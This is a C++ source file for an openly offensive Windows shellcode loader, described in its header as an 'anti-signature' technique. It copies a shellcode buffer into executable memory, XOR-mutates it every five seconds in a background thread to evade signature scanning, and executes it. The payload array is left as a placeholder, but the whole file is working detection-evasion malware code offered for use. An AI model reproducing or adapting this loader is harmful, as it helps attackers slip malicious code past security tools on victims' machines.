// Filename: memory_mutation_fluctuation.cpp
// Description: Copy shellcode to memory, mutate every few seconds, and run – anti-signature
// Author: Joas A Santos

#include <windows.h>
#include <iostream>
#include <thread>

unsigned char shellcode[] = {
    // Shellcode payload here (stage 1 loader, for example)
};

void MutateShellcode(unsigned char* code, size_t len) {
    for (size_t i = 0; i < len; i++) {
        code[i] ^= (BYTE)(i % 0xFF); // Simple mutation
    }
}

void RunFluctuatingShellcode() {
    unsigned char* mem = (unsigned char*)VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(mem, shellcode, sizeof(shellcode));

    std::thread mutateThread([=]() {
        while (true) {
            MutateShellcode(mem, sizeof(shellcode));
            Sleep(5000);
        }
    });

    ((void(*)())mem)();
}

int main() {
    std::cout << "[+] Executing fluctuating shellcode...\n";
    RunFluctuatingShellcode();
    return 0;
}
